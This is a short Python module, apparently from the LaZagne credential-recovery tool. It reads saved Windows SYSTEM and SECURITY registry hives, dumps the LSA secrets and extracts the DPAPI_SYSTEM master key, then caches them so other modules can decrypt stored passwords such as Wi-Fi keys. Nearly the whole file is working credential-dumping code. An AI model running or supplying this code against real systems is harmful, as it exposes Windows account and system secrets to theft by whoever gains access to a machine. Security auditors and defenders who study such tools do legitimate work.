# -*- coding: utf-8 -*- 
from creddump7.win32.lsasecrets import get_file_secrets
from lazagne.config.write_output import print_debug
from lazagne.config.module_info import ModuleInfo
from lazagne.config.winstructure import *
from lazagne.config.constant import *
import tempfile
import random
import string
import struct
import os

class LSASecrets(ModuleInfo):
	def __init__(self):
		ModuleInfo.__init__(self, 'lsa_secrets', 'windows', system_module=True)

	def run(self, software_name=None):

		# DPAPI structure could compute lsa secrets as well, so do not do it again
		if constant.lsa_secrets:
			return ['__LSASecrets__', constant.lsa_secrets]

		isVistaOrHigher = False
		if float(get_os_version()) >= 6.0:
			isVistaOrHigher = True
		
		# Get LSA Secrets
		secrets = get_file_secrets(constant.hives['system'], constant.hives['security'], isVistaOrHigher)
		if secrets:
			
			# Clear DPAPI master key 
			clear 	= secrets['DPAPI_SYSTEM']
			size 	= struct.unpack_from("<L", clear)[0]
			secrets['DPAPI_SYSTEM'] = clear[16:16+44]

			# Keep value to be reused in other module (e.g wifi)
			constant.lsa_secrets = secrets

			pwdFound = ['__LSASecrets__', secrets]
			return pwdFound
